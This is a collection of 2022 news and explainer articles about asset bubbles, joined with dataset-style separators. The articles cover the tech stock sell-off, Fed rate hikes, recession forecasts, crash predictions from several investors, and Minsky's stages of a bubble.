In the best of times, the bursting of asset price bubbles, either as a result of rising interest rates or disappointing economic growth, would pose difficult economic challenges. But their bursting today would be particularly challenging since they would be occurring across many asset classes and amid record high debt levels and dangerously high leverage ratios.

John Maynard Keynes purportedly advised economic policymakers to be prepared to change their minds when the facts change. His advice is particularly appropriate in today’s world of heightened economic uncertainty. If the latest COVID variant proves to be more transmissible and vaccine resistant than expected, it could prove to be the trigger that bursts today’s asset price and credit market bubbles. In that event, the Fed and the ECB should be quick to put on hold any plans to tighten monetary policy.

Last week, Apple lost USD 220 billion in value in just three days. Not just Apple, a host of major US tech companies lost more than USD 1 trillion in combined value in a short period, begging the question – is it another dot com crash in the making?

The 2002 stock market crash pushed the US economy into recession. Last month, Deutsche Bank warned that the recession might hit the US in late 2023, largely due to the Federal Reserve’s steps to contain inflation.

“The entire US economy is about to shut down again, but this time it won’t be a dress rehearsal like with COVID-19. This will be the real thing. We won’t ask businesses to close; they’ll have no choice but to close. Tens of millions will be fired from jobs that will never return,” said Peter Schiff, chief global strategist at Euro Pacific Capital.

Taming inflation

The Fed has been raising interest rates aggressively over the months to fight the high inflation rate. Earlier this month, the Fed approved a rare half-percentage-point interest rate increase and a plan to shrink its USD 9 trillion asset portfolio. Notably, this is the largest increase in interest rates since 2000.

The apex bank raised the federal funds rate to a target range between 0.75 percent and 1 percent. Despite the backlash, traders expect the Fed to continue increasing the rates in the coming months to hit 3 percent by 2022.

Deutsche Bank, in a report, said the US economy would decelerate sharply in the second half of 2023. “We expect annual headline CPI to be 7.2 percent this year, with core CPI inflation remaining at or above 3 percent until 2024. We expect the Fed will raise rates by 50bps at each of the next three meetings, followed by 25bp moves at the remaining meetings this year. Beyond that, it will rise to 3.6 percent by June 2023,” the report said.

US President Joe Biden said fighting inflation is his administration’s priority. “We’re headed straight into a recession if we continue down the path. Joe Biden, and his Democrats have us on. We can’t keep up this endless spending. We can’t keep passing insane omnibus budgets,” said Kathy Barnette, a Republican candidate for US Senate in Pennsylvania.

We’re headed straight into a recession if we continue down the path Joe Biden and his Democrats have us on.



We can’t keep up this endless spending. We can’t keep passing insane omnibus budgets.



It’s time for leaders who will be a hard “NO!” on Biden’s endless spending sprees! — Kathy Barnette (@Kathy4Truth) May 8, 2022

Indices

If the Fed raises interest rates too much and too quickly, it could push the US economy into a recession. On the other hand, if the Fed doesn’t raise the interest rates, inflation will soar.

The three leading US stock market indices– Nasdaq, S&P 500, Dow 30– have been under pressure since this year. The S&P 500 stock index fell below the 4,000 mark on Monday for the first time since March 2021. Nasdaq closed at its lowest level since November 2020.

S&P 500, Dow 30 and Nasdaq Composite were down by 3.2 percent, 1.99 percent and 4.29 percent, respectively. Earlier this month, the Dow and Nasdaq saw their worst single-day declines since 2020.

Tech stocks go into a tailspin

“Stock markets more recently are witnessing huge sell-offs after the Bull Run witnessed in the last year or so. Tech stocks typically bear the brunt during such times, especially the early-stage tech companies, as a large number of them are not profitable and rely on funding from VCs and PE. We are likely to witness a combination of slow down in tech funding as well as a recalibration of valuation expectations of founders. A slowdown in funding may have an impact on the growth plans of these companies and may lead to lay-offs in the near term. This, in turn, is likely to have a negative impact on the US economy and in the event, the US economy does slip into a recession, the recovery is likely to be slow and painful,” said Janani Sankaran, associate director, BFS Practice, Frost & Sullivan.

In 2021, tech stocks accounted for nearly 25 percent of the S&P 500. In addition, more than half of Nasdaq’s 3,000+ stocks are tech.

While Apple lost USD 220 billion in valuation, Microsoft lost USD 189 billion. Alphabet’s valuation was down by USD 123 billion. Meta and NVIDIA lost USD 70 billion and USD 85 billion, respectively.

“The sharp fall in the stock prices of high growth tech companies across the globe is getting crazy, it feels like the dot-com boom. It is ridiculous how quickly the expectations changed from growth at all costs to generating free cash flows to survive the next 2 to 3 years since raising funds might be tougher. It is almost impossible for businesses to quickly adapt, especially the larger ones,” said Nithin Kamath, founder and CEO of Zerodha.

The US is in its fourth super-bubble in 100 years, according to Jeremy Grantham, co-founder and chief investment strategist of Grantham, Mayo, & van Otterloo.

In The Megyn Kelly Show, Schiff said the overpriced US tech stocks most people own are at risk. “We’re inflated during the bubble and will collapse as the air comes out of that bubble,” he added.

Tech stocks are crashing and burning because of tighter monetary policies and rising interest rates. As a result, many tech investors are selling off their stocks. The sell-off in the equity market is bringing down valuations of the biggest tech companies in the world. Moreover, with the Fed set to increase interest rates further, the bubble might burst at some point.

“Been a brutal sell-off in tech stocks that is hard to digest for tech bulls like us. Tech earnings bullish for enterprise/product-driven names; outside supply chain issues show demand intact. Fighting the Fed thesis we get, but this sell-off magnitude is irrational in our opinion,” said Dan Ives, MD, Equity Research at Wedbush Securities.

Nathan Baschez, co-founder and president at Every Inc, said the long-awaited tech correction might be finally happening.

Shit is hitting the fan 😟



I’ve worked in tech since 2010, and the whole time people have been publishing articles warning that there was a tech bubble just about to burst.



Now, the long-awaited tech correction might actually be happening. — Nathan Baschez (@nbashaw) May 6, 2022

Investors losing confidence

2022 was a reality check for investors. To weather the COVID-19, the Fed lowered interest rates, resulting in many investors betting big on tech stocks, sending the whole sector into overdrive.

Many tech companies that raised funds over the years are still pre-revenue. As a result, most of them will not make money for years. Further, sales and profit are expected to slow down after nearly five years of explosive growth. Most tech companies are overvalued. “An entire generation of entrepreneurs & tech investors built their entire perspectives on valuation during the second half of a 13-year amazing bull market run,” said Bill Gurley, general partner at Benchmark.

Last month, Alphabet posted its slowest quarterly revenue growth since 2020. Meta reported the slowest sales growth in a decade. Netflix saw its subscriber growth turn negative in more than a decade for the first time. The streaming company lost 200,000 subscribers globally in Q1 2022. Such developments indicate the huge gains accrued during the pandemic are going down.

“Investor sentiment in Silicon Valley is the most negative since the dot-com crash,” said David Sacks, a co-founder and partner at Craft Ventures.

Layoffs

“A recession in the US this time is likely to be as bad if not worse than the 2008 financial crisis. A US recession coupled with inflation due to supply chain and geopolitical reasons is to be viewed with caution. A recession may also lead to job losses, defaults in loan servicing, credit card defaults, and home and student loan defaults. Structural level reforms may be needed in addition to any financial relief package assuming there is headroom available as part of the cure for a recession. The impact of the US recession on the world economy is also expected to be severe – with emerging economies bearing the brunt of the same,” Janani said.

Unemployment and recession go hand in hand. According to the Bureau of Labour Statistics, the unemployment rate remained at 3.6 percent in April. In fact, the US job market added more jobs last month than expected; however, the tech sector is showing signs of contraction.

Meta is set to put hiring on hold for most of its mid- or senior-level positions. Robinhood plans to let go of nine percent of its full-time employees. The company had gone on a hiring spree during the COVID-19 pandemic.

Peloton is downsizing by about 20 percent as part of a cost-cutting measure. Activant Capital founder Steve Sarracino said millions of tech workers could be laid off in the next couple of years.

Tech funding drying up?

In 2021, the global venture capital investment amounted to a staggering USD 643 billion. According to Crunchbase, the global VC funding last February (USD 52 billion) dropped by USD 10 billion month-on-month. However, the funding corpus grew by USD 10 billion on a year-on-year basis.

The early-stage funding and late-stage funding fell by 17 percent and 19 percent, respectively. Meanwhile, the seed-stage funding witnessed a small spike month-over-month.

Last March, Pitchbook released a report warning startups of a slowdown in venture funding and how to deal with it. Matt Turck of FirstMarkCap, a New York-based VC firm, said the “growth market was pretty much dead”, and the market is seeing a marked slowdown in Series A and B.

According to a report by CB Insights, global venture funding reached USD 143.9 billion in the first quarter of 2022, down 19 percent from the previous quarter.

That said, VCs operate on a different cycle than public stock markets, according to PitchBook. So it is still early to extract a trend. Also, seed funding witnessed an uptick month-to-month, indicating that investors are still willing to bet on tech startups. But the question on everyone’s mind is, will investors start playing safe from now on, given how tech stocks are crashing?",Asset Bubble Burst,2022-05-17 07:00:00

That’s what Robert Kiyosaki, author of Rich Dad, Poor Dad, has just done by forecasting “the biggest crash in world history”.

Not only that, he has also put a time limit on it. This month. October 2021. He is warning that Chinese property developer Evergrande is in danger of defaulting on debts totalling $300 billion and this could trigger a global stock and property crash.

Or as he put it in a tweet: “China’s Evergrande Group cannot pay. Valuation of properties fake. Will real estate crash spread to US? Yes.”

Great stock and real estate opportunities coming for smart investors. Disaster for foolish investors — therealkiyosaki (@theRealKiyosaki) September 22, 2021

Shares will fall, too, apparently. Also gold, silver and Bitcoin. It’s quite a prediction and it’s exactly the type of thing experienced investors expect at this time of year.

The Bank Panic of 1907, the Wall Street Crash of 1929 and Black Monday in 1987 all happened in October. No wonder investors get jittery as Halloween looms.

So, how worried should you be and which asset classes are likely to be hit hardest?

Stocks and shares

Investors should not pay too much heed to the so-called “October effect”, Vijay Valecha, chief investment officer at Century Financial in Dubai, says. “While several of the stock market’s biggest crashes have occurred in October, history also shows the US S&P500 often delivers positive gains during the month, including six of the past 10 years.”

The global economy faces a number of severe challenges right now, including “US-China trade tensions, gathering inflation, tighter monetary policy, supply-side bottlenecks and record high global debt”, says Russ Mould, investment director at AJ Bell.

He believes China will be able to contain the Evergrande crash, but cautions: “If it doesn’t, markets could be in for a bumpy ride.”

The stock market faces plenty of headwinds as the US Federal Reserve considers tapering monetary stimulus this year and hiking interest rates in 2022, Chaddy Kirbaj, vice director at Swissquote Bank, says.

“Tapering may take more time than many expect, but cheap money won’t sustain the current market euphoria for much longer,” he adds.

Inflation is the big worry as the cost of living shoots up amid rising energy prices, supply chain disruptions, red-hot commodities and global food price spikes, Mr Kirbaj says.

“Unless this is transitory, the global economy will fall into stagflation, with stagnant growth and high inflation. This could happen sooner rather than later.”

Quote Investors should not pay too much heed to the so-called October effect Vijay Valecha, chief investment officer, Century Financial

So, what would all this mean for your portfolio?

Although the crash might not happen, investors should prepare a game plan in case it does, Mr Valecha says. “In a crash, most sectors perform badly. However, others fare relatively well, including utilities, consumer staples and health care.”

If worried, he suggests investors shift some of their portfolios into lower-volatility businesses that are less sensitive to economic cycles and market corrections.

“Whether the economy is shrinking or growing, these companies enjoy steady demand and produce predictable cash flows,” Mr Valecha adds.

Even defensive stocks will fall with everything else in a crash, but they will cushion you from the worst of the sell-off.

A number of specialist exchange-traded funds (ETFs) target defensive stocks, such as the Consumer Staples Select Sector SPDR Fund. For those wanting healthcare exposure, investors may want to consider the iShares US Healthcare Providers ETF.

Mr Valecha also suggests buying the SPDR S&P Oil & Gas Exploration & Production ETF, which should be a beneficiary of the global energy crisis.

“Higher energy costs will hammer industries that consume a lot of power but boost gas, oil and coal producers as winter approaches and demand rises,” he says.

US technology stocks are the biggest winners of the past decade, but could suffer in a crash.

“Stimulus spending has peaked, economic and corporate earnings growth are set to decelerate and the Biden administration has proposed hiking corporate and personal tax rates. None of this will sit well with holders of increasingly pricey technology shares,” Mr Valecha says.

However, this could also present a buying opportunity if there is a crash and Mr Valecha says one option for investors is the Invesco QQQ ETF, which tracks the Nasdaq 100 tech index. “Growth stocks like the tech giants tend to bounce back faster in a recovery.”

Mr Kirbaj also favours defensive utilities, consumer and healthcare stocks with sustainable dividends and is wary of US tech as interest rates rise. “However, tech sectors such as cyber security and artificial intelligence may fare better,” he adds.

Gold

Gold is a traditional safe haven in tricky times and you would expect it to shine in a crash.

Yet, the gold price fell slightly over the past month, despite growing jitters. It is down 7 per cent this year to $1,748 an ounce at the time of writing.

But Mr Kirbaj remains bullish and believes the precious metal will prove an attractive store of value as global inflation rises.

Josh Saul, chief executive of The Pure Gold Company, reports a 700 per cent increase in first-time investors purchasing physical gold bars and coins. “Our clients are looking for a safe-haven asset that will protect their wealth amidst growing uncertainty.”

At the same time, he has also seen a 257 per cent increase in clients selling “to provide liquidity for debt and bills that their depleted incomes won’t cover”.

Gold is best viewed as an insurance policy against falling assets such as shares and depreciating currencies, Mr Saul says. “It should prove its worth as uncertainty increases.”

Cash

If interest rates start rising and stock markets crash, cash may seem like the obvious beneficiary. The danger is that central bankers will be slow to increase rates, in the hope that rising prices are transitory, so the value in cash will fall even faster in real terms.

Mr Kiyosaki suggests that investors might like to keep some cash handy to buy bargain stocks in the aftermath of the upcoming crash but others are more sceptical, including Mr Kirbaj.

“Although bond yields are rising, we aren't considering cash as an investment for now,” he says.

Bitcoin

Bitcoin is enjoying yet another resurgence, busting through the $50,000 barrier to trade at around $55,000 at the time of writing. Could a new all-time high be in sight?

The recent rally is impressive given China's tightening of regulations surrounding cryptocurrencies, says Fawad Razaqzada, market analyst at ThinkMarkets.com. “Bitcoin is possibly being seen as a tool to hedge against inflation, a safe-haven asset independent of central bank control,” he says.

Expand Autoplay Bitcoin slid about 8 per cent to $40,237 in early Asian trading on September 21, 2021, dropping to its lowest level since the beginning of August. Reuters

Investors also hope that more countries will adopt cryptocurrencies over time and China might have second thoughts when digital currencies become more established.

“Some are betting that Brazil might be the next country to embrace Bitcoin as legal tender, after El Salvador. That would be a monumental moment, given that Brazil is the 12th-largest economy in the world with a huge population of more than 200 million people,” Mr Razaqzada adds.

Mr Kirbaj is also a Bitcoin bull. “More traders and long-term investors will bet on Bitcoin and other cryptos, including ETFs and structured products, as confidence in the traditional monetary system is fading,” he says.

US dollar

The US dollar is holding firm and that should continue, says Matt Weller, global head of research at Forex.com.

US bond yields are rising as investors anticipate higher US interest rates. “Two-year Treasury bonds have one of the best correlations with the US dollar and yields are now testing 0.28 per cent, their highest level since the onset of Covid-19 last March. They are up 10 basis points from the start of September,” Mr Weller says.

Quote Bitcoin is possibly being seen a tool to hedge against inflation, a safe-haven asset independent of central bank control Fawad Razaqzada, market analyst, ThinkMarkets.com

Two-year Treasury yields have since crept up to 0.30 per cent, which may seem low but marks an 18-month high and more could be in store.

If the trend continues, the greenback could get stronger from here.

Bonds

Rising inflation is bad for bonds for two reasons. First, bonds pay a fixed income and this will look less attractive if investors can get a higher return from other lower-risk assets such as cash.

Second, as yields rise, bond prices fall, which means investors get less back when their bond finally matures.

At one point, more than $15 trillion of global bonds were trading on negative yields, which meant investors were paying people to look after their money.

Those days may be drawing to a close if interest rates rise to curb inflation, Althea Spinozzi, fixed-income strategist at Saxo Bank, says.

The question is how soon the Fed acts. “So far, it has decided inflation is transitory and held interest rates low, supporting bonds,” she adds.

The longer central bankers wait before pulling monetary support, the more aggressive they will need to be, Ms Spinozzi says. “This could provoke an unexpected rise in real yields that will increase market volatility and put weaker corporate bond issuers at risk.”

Jeremy Grantham, co-founder of hedge fund GMO, is warning that stocks could fall a lot further.
He made a similar proclamation about the end of the bull market in January 2021 , calling stocks an ""epic bubble.""","New York (CNN Business) Stocks are off to a tough start this year . The tech-heavy Nasdaq is already in a correction , a more than 10% drop. And if one the most influential hedge fund managers is to be believed, this could be only the beginning of a very painful time for investors.

Jeremy Grantham, co-founder and chief investment strategist of Grantham, Mayo, & van Otterloo (GMO) said in a report called ""Let the Wild Rumpus Begin"" that stocks are now in the midst of a ""superbubble,"" that it won't end well.

Grantham, who has been running the firm's investments since it was started in 1977, was similarly bearish at market tops in 2000, and during the Great Financial Crisis of 2008.

""Good luck! We'll all need it,"" said Grantham, whose firm manages about $65 billion in assets.

He noted that US stocks have experienced two such ""superbubbles"" before: 1929, a market fall that led to the Great Depression, and again in 2000, when the dot-com bubble burst. He also said the US housing market was a ""superbubble"" in 2006 and that the 1989 Japanese stock and housing markets were both ""superbubbles.""

""All five of these superbubbles corrected all the way back to trend with much greater and longer pain than average,"" Grantham wrote.

Many investors don't want to believe that the stock market is overdue for a broader pullback, Grantham argues, especially since the market fell into bear territory -- albeit briefly -- in March 2020 at the pandemic's start.

""In a bubble, no one wants to hear the bear case. It is the worst kind of party-pooping,"" Grantham wrote. ""For bubbles, especially superbubbles where we are now, are often the most exhilarating financial experiences of a lifetime.""

Grantham believes that the Federal Reserve's moves to cut rates to zero -- and then keep them there for nearly two years -- is a main cause for the market's current frothiness. The Fed is widely expected to begin raising rates at its March meeting.

""One of the main reasons I deplore superbubbles -- and resent the Fed and other financial authorities for allowing and facilitating them -- is the under-recognized damage that bubbles cause as they deflate and mark down our wealth,"" he wrote.

Jeremy Grantham, co-founder of hedge fund GMO, is warning that stocks could fall a lot further.

Grantham added that ""as bubbles form, they give us a ludicrously overstated view of our real wealth, which encourages us to spend accordingly. Then, as bubbles break, they crush most of those dreams and accelerate the negative economic forces on the way down.""

""To allow bubbles, let alone help them along, is simply bad economic policy,"" Grantham wrote, adding that he's concerned about ""the terrible increase in inequality that goes with higher prices of assets, which many simply do not own.""

This isn't the first time Grantham has issued such a doom and gloom call on the markets. He made a similar proclamation about the end of the bull market in January 2021 , calling stocks an ""epic bubble."" The market wrapped up 2021 near record highs and with its third straight year of gains.

Rate hikes will deflate a lot of the market's hot air

Other investing experts share some, but not all, of Grantham's concerns. Jordan Kahn, president and chief investment officer of ACM Funds, which has a portfolio that both buys stocks and short sells ones that it thinks are overvalued, said there are definitely more opportunities on the short side of the market right now.

Kahn told CNN Business that his long-short fund is only invested about 30% in bullish positions that it expects to go up. He is also worried about what will happen to stocks as rates go up.

""When rates are at zero for a long time, it's easy to justify almost any valuation, and coming out of 2020 we saw ridiculous prices for stocks,"" he said, something he hadn't seen since 1999. ""But as soon as inflation started people question valuations.""

Still, Kahn isn't as bearish as Grantham. Rather than an epic crash, he foresees a series of what he calls ""bubble-ettes,"" mini manias in corners of the market such as crytpocurrencies and speculative, unprofitable tech stocks.

""There has been a lot of blind faith,"" Kahn said. ""There are areas where there has been a lot of speculation and there will be pain there.""",Asset Bubble Burst,2022-01-21 08:00:00

That's according to Harry Dent, President and Founder of HS Dent. Dent spoke with Michelle Makori, Kitco News's Editor-in-Chief and Lead Anchor.

""I think the market has already topped, January 4th for the S&P 500, and we're heading down,"" said Dent. ""And the Federal Reserve is going to find out that their something-for-nothing stimulus didn't really work in the end, and people are going to find this out only when things crash.""

Although the stock market has done well over the last few decades, Dent said this is deceptive.

""People are now thinking it can only go up,"" said Dent. ""You have to get shocked out of that, you know? History shows a 40 percent crash within the first several months.""

He explained that the Federal Reserve's ""money printing"" has sustained the economy up until now. Yet when the crash comes, it will be worse than people think.

""We're about to go into a recession already… There's no soft landing here. The Fed is hoping for that. They don't understand the underlying trends of the economy… We are so overstretched, the biggest bubble in everything… You can't keep a dead body going.""

Dent bases his predictions on demographic trends. He believes we are about to enter a deflationary period as Baby Boomers die.

""We've never seen a smaller generation [Millennials] following a bigger one [Boomers],"" said Dent. ""[The] Baby Boomers caused the greatest boom in history… from 1983 to 2007. And ever since, why have they [The Fed] been stimulating so hard?... Because you're fighting a downtrend. The biggest generation in history is dying.""

Dent opined that long-term U.S. treasury bonds will be the best-performing asset. He also thinks that gold's price will fall.

""Gold is an asset that has bubbled, like everything else… [All] financial assets that bubble will crash… I would say in the next year or two, [gold will be] down to $900 to $1,000 [USD].""

""Bitcoin is going to be the new digital standard, I think, for money,"" said Dent, evoking the gold standard. ""If we have this crash I'm predicting in the next two years, the number one thing I'd buy would be Bitcoin or Ethereum, coming out of it.""

When it comes to the Ukraine conflict, Dent explained that Putin was acting unwisely. ""[Putin] is being aggressive,"" said Dent. ""The world could go into a downturn, and he could be blamed for triggering the downturn, even though it wasn't really him… I think it's the death of Putin… Putin has bad timing here."" Dent said that the world will go into a global ""depression,"" which could force a peaceful resolution of the Ukraine conflict.

While most investors dislike down days for the stock market, I’m happy to see some red on the names that I’ve been eager to buy at lower prices.

The S&P 500’s forward 12-month price-to-earnings (P/E) ratio currently hovers at 19.4, closer to the five-year average of 18.6. Rather than burst in spectacular fashion, the asset bubble has incrementally released air.

To be sure, the markets have been volatile. Skilled options traders are adept at taking advantage of volatility, but sharp moves up and down tend to unnerve the average investor. The main U.S. stock market indices bounced between gains and losses Tuesday to finally close higher, as follows: the Dow Jones Industrial Average +0.80%; the S&P 500 +0.95%; the NASDAQ +0.94%; and the Russell 2000 +1.57%.

In pre-market futures contracts Wednesday, the indices were trading lower in the wake of a pessimistic economic report. The World Bank’s Global Economic Prospects report, released Tuesday, projects that world growth will slow to 2.9% this year from 5.7% in 2021. The outlook is bleaker than the one delivered by the bank six months ago, largely due to Russia’s invasion of Ukraine.

It also doesn’t help that the average price of gasoline in the U.S. is $4.95. That’s bad for consumers, and it’s certainly bad for the incumbent Democratic party as the midterm elections loom. Any presidential administration, regardless of party, has limited tools to push down gas prices.

Wall Street is getting more pessimistic about the second quarter, as inflation continues to rage and there’s ostensibly no end in sight to the Russia-Ukraine carnage. Corporate profit margins are getting hammered by higher input and operating costs.

But longer term, the analyst view is more bullish, on the assumption that these challenges will eventually get sorted out by the end of the year.

During the first two months of Q2 2022, the analyst consensus reduced earnings per share (EPS) estimates for S&P 500 companies for the quarter, according to FactSet.

The Q2 bottom-up EPS estimate was reduced by 1.3% (to $55.36 from $56.06) during this period. “Bottom up” is an aggregation of the median EPS estimates for Q2 for all the companies in the index (see chart):

Seven of the 11 S&P 500 sectors witnessed a decrease in their bottom-up EPS estimate for Q2 2022 from March 31 to May 31, led by consumer discretionary (-15.8%) and communication services (-7.3%) sectors.

Four sectors posted an increase in their bottom-up EPS estimate for Q2 2022 during this period, led by energy (+29.4%) and materials (+8.7%). As energy prices soar, energy has been the top performing sector this year.

The above chart also serves as a reminder, if any were needed, of how dire the earnings picture looked during the nadir of the pandemic in Q2 2020.

It’s telling that as analysts cut EPS projections in aggregate for Q2 2022, at the same time they boosted EPS estimates in aggregate for the next two quarters. The bottom-up EPS estimate for Q3 was raised by 0.4% (to $59.52 from $59.26) from March 31 to May 31, while the bottom-up EPS estimate for Q4 was hiked by 0.2% (to $60.78 from $60.74) during this same period.

There’s mounting evidence that U.S. equity markets have bottomed and are positioned to reverse losses in the second half of 2022. We’re also seeing signs that the economy can avoid a recession.

Inflation remains uncomfortably hot, but the latest data suggest that the rate of inflation is slowing. We’ll get a clearer picture of inflation on Friday, when the government releases the consumer price index (CPI) data for May. The consensus forecast is for a year-over-year increase in the CPI of about 7%, which would still be high but a deceleration from April’s 8.3%.

This week, bellwether retailer Target (NYSE: TGT) reduced operating profit guidance for Q2, sending its shares tumbling (yet again). Target announced aggressive actions to reduce costs, including markdowns and order cancellations.

But let’s look at the positives. In the U.S., the jobs market remains strong, and by extension, so does consumer spending. Retailers are getting squeezed on operating costs, but consumers remain in the mood to spend. Households and corporations are sitting on hefty cash hoards. The global growth engine of China is gearing up again, in the wake of Beijing’s recent reduction of interest rates and removal of COVID lockdowns.

If Target and other beleaguered companies readjust their inventories and inflation starts to ease, conditions could be in place for a big stock market rebound as we get closer to 2023.

The Zurich-based private bank wants to place itself at the intersection of “digital assets and the fiat world”, according to a statement on the bank’s updated strategy on Thursday. Pilot programs are currently in place with an eye to offering advice, trading and investing in cryptocurrencies to its rich customers.

“It could well be that at this very instant we are witnessing a bubble-burst moment of the crypto industry, and we all know what happened after the dot-com bubble burst 30 years ago,” Chief Executive Officer Philipp Rickenbacher said during a presentation of the bank’s strategy to investors on Thursday.

“It paved the way for the emergence of a new sector that indeed transformed our lives; I believe digital assets and decentralized finance hold that same potential,” he said.

Baer’s shift toward offering crypto services is in stark contrast to Zurich rival UBS Group AG, one of the world’s largest wealth managers which so far has said it’s not interested in advising clients on “speculative” assets. Baer has taken a stake in SEBA Crypto AG, one of the two fully-regulated crypto banks in Switzerland.

Baer said when investing in SEBA in 2019 it was “convinced” that digital assets-- a catch all term for cryptocurrencies, blockchain technologies, tokenized assets, and non-fungible tokens-- would become a “legitimate sustainable asset class of an investor’s portfolio”. The relationship with SEBA has allowed Baer to refer clients seeking exposure to crypto-related investing and trading without the bank developing out its own infrastructure for custody and risk-management of the asset.

The bank plans to develop its own research to clients on crypto, DeFi, and blockchain and ultimately provide regulated advice on investing and trading in the asset class, and the platform for them to do so at Baer.

The pilot programs concern token booking, trading, and compliance to test and learn, and develop the vocabulary around digital assets.

Speculative Assets

UBS Chief Executive Ralph Hamers said last year that the wealth-management giant would not be actively offering clients the ability to invest or trade in crypto, calling it an untested and speculative asset class. “We don’t advise on speculation,” Hamers said during an earnings call in October.

“We believe crypto has been ineffective as a portfolio diversifier or inflation hedge,” UBS’s chief investment office led by Mark Haefele said in a note to wealth clients this week as the asset class tumbled on the back of the collapse of stablecoin TerraUSD.

So far global banks been wary on engaging with the emerging asset class, which is still perceived as too risky and inadequately regulated. Banks are also required to hold high amounts of capital for every cryptocurrency they hold on their balance sheet, making doing business in the asset class costly. Jamie Dimon, JPMorgan Chase CEO, said at the annual shareholder meeting on Wednesday that the bank was working with regulators on clearer rules around crypto.

Rather, traditional finance has looked at the emerging technology applications that have come with the creation of blockchain and crypto coins.

Baer also wants to invest in this area “where traditional cost-heavy and complex parts of the old banking system are today just rewritten with a few lines of code.” The CEO cited areas such as cross-border payments and escrow services that are ripe for this type of innovation.

Rickenbacher said the bank is prepared to navigate the disruptions decentralized finance will “inevitably” pose to both clients and the bank’s own operations.",Asset Bubble Burst,2022-05-19 07:00:00

Asset bubbles are important puzzles in financial economics—important because of their extraordinary potential for disruption; puzzles because they defy standard notions of rationality.

In this article, we would explore what a bubble is and the different stages that make up a Financial bubble to give you a good footing the next time you see one.

What is a bubble

A “bubble” is a scenario in which the price of a single stock, a financial asset, or even an entire sector, market, or asset class exceeds its underlying value by a significant margin.

Since speculative demand fuels inflated prices rather than fundamental value, the bubble will eventually burst, and enormous sell-offs will cause prices to fall, often substantially.

In the vast majority of situations, a speculative bubble is followed by a catastrophic crash in the underlying securities. Consider the dot-com and more recently the real estate bubble.

What fuels a Bubble?

Pure speculation fuels a stock market bubble. When the price of an asset begins to rise at a rate that much exceeds its fundamental value, a bubble begins to form.

Former Federal Reserve Chair Alan Greenspan coined the term “irrational exuberance” to characterize the collective enthusiasm among traders and investors that support quickly rising prices that outpace underlying fundamentals.

Whether you call it herd mentality, the bandwagon effect, or fear of missing out (FOMO), there is a self-perpetuating cycle in which individuals want to acquire an asset because its price is rising, which drives the price even higher and makes more people want to buy it.

It’s crucial to remember that not all price accelerations are bubbles. It’s common for asset prices to rise sharply after a recession or bear market, for example.

What Makes an Asset Bubble Pop?

An asset bubble pops when there’s a drastic change in expectations. For example, a prominent market participant could cause excitement to sour. Or the bubble could burst as a result of selling activity that makes investors nervous, causing a panic that results in people selling the asset as quickly as possible.

While market participants may try to curb both the sudden surge and decline in prices during a bubble, there’s not much they can do other than urge caution.

During large drops or periods of intense volatility, the U.S. Securities and Exchange Commission (SEC) has a mechanism in place to prohibit trading activity in individual assets to try and give the market a chance to cool down.

Stages of a Bubble

Stock market bubbles generally follow the same five stages, first identified by American economist Hyman Minsky:

Displacement: A big change, or a series of adjustments, influences how investors think about markets in the early stages of a bubble. This paradigm shift could be caused by a significant event or invention that prompts people to modify their expectations regarding the asset in issue, with positive intentions.

A big change, or a series of adjustments, influences how investors think about markets in the early stages of a bubble. This paradigm shift could be caused by a significant event or invention that prompts people to modify their expectations regarding the asset in issue, with positive intentions. Boom: Price increases during the displacement stage, but things really get up during the second stage of a bubble. As word of the asset’s gains spreads, the boom period attracts speculators, who assist drive the price of the asset higher.

Price increases during the displacement stage, but things really get up during the second stage of a bubble. As word of the asset’s gains spreads, the boom period attracts speculators, who assist drive the price of the asset higher. Euphoria: As asset values surge, caution is thrown into the breeze during this moment. The “greater fool” theory—the belief that no matter how prices go, there will always be a market of purchasers willing to pay more—plays out everywhere during this phase, as new valuation measurements and criteria are claimed to justify the constant climb.

Profit Taking: During this stage, the smart money begins to sell holdings and take profits, heeding warning signs that the bubble is ready to collapse. However, predicting when a bubble will burst can be challenging. Inevitably, the price increase proves to be too good to be true. Booms are followed by collapses, and as the bubble enters the profit-taking stage, some investors begin selling to lock in gains.

Booms are followed by collapses, and as the bubble enters the profit-taking stage, some investors begin selling to lock in gains. Panic: While some late-comers to the game may have waited out in the past, hoping that an asset’s price would rise again, by the time the bubble reaches its panic stage, that’s no longer a viable option. Instead, the zeal to acquire an item has given way to panic to sell it. The price drop wipes out gains rapidly and stimulates additional panic-driven selling.

How to guard yourself against a bubble

To prevent the inevitable risk of investing in a bubble that will eventually burst, thoroughly analyze your motives for investing before doing so.

Hence, you must try to stay away from chasing returns out of FOMO or to jump on a bandwagon. Your return expectations will be impacted by the inherent value of an asset rather than speculation if you do so.

Value investing, which entails selecting stocks whose share price is trading below their inherent value or book value, is my suggested technique. Warren Buffett, the billionaire investor, favors this method as well.

Another recommendation is to invest in a broad portfolio of index funds to reduce the chance of any one investment failing while preparing for long-term growth. It may not have reached the skyrocketing heights of asset bubble investments, but it has the ability to increase steadily over time.

Finally, you have to revalue all your existing assets and reprice them based on core fundamentals. Most set bubbles are driven by sentimental reasons rather than economic or financial factors. Thus, when a bubble burst, the same sentimental factors that create it is what will puncture it.

Repricing assets require that you identify assets that you own that are vulnerable to price crashes when the asset bursts.",Asset Bubble Burst,2022-04-29 07:00:00

And when it comes to bubbles, the concern is what will happen when they inevitably ""pop,"" causing demand to drop and assets to shed their value. For investors, that could mean holding an asset that is nearly worthless.

Have we entered bubble territory, or is this just a booming time for assets? Some experts argue that in today's market, financial asset prices are high relative to historical levels.

Asset Bubbles Explained

A bubble occurs when an asset's price increases in a short period to unprecedented levels. This occurs when there is demand for a particular asset, resulting in a price surge that is often uncorrelated with the asset's fundamentals.

Eventually, the bubble forms, reaches unsustainable levels and ""pops."" When the bubble bursts, the asset's price crashes, demand for the asset falls and other economic consequences follow.

To help explain what an asset bubble is, it's illustrative to look back on the 17th century's Dutch tulip mania, one of the most famous bubbles of all time.

In Holland during the 1600s, the tulip was among the most desired flowers. Initially, the high demand exceeded supply, which pushed prices to sky-high levels. As demand continued to blossom, farmers started growing more tulips. Eventually, tulip supply exceeded demand, and the tulip market reached its peak, with supply outstripping buyer needs.

Panic ensued, which caused the tulip bubble to burst, and tulip growers, investors and sellers lost fortunes overnight.

While today's potential asset bubbles aren't flower-powered, some of the same trends and investor fears apply.

Are Stocks in a Bubble?

The high prices some stocks have reached in 2021 may have investors craning their necks.

Big Tech stocks have helped push markets to all-time highs this year, with household names such as Google parent Alphabet Inc. (GOOG, GOOGL) gaining about 90% year over year and Facebook Inc. (FB) up about 40%.

Additionally, the S&P 500 is up about 32% in the last year and has gained approximately 100% since the pandemic-fueled crash of March 2020.

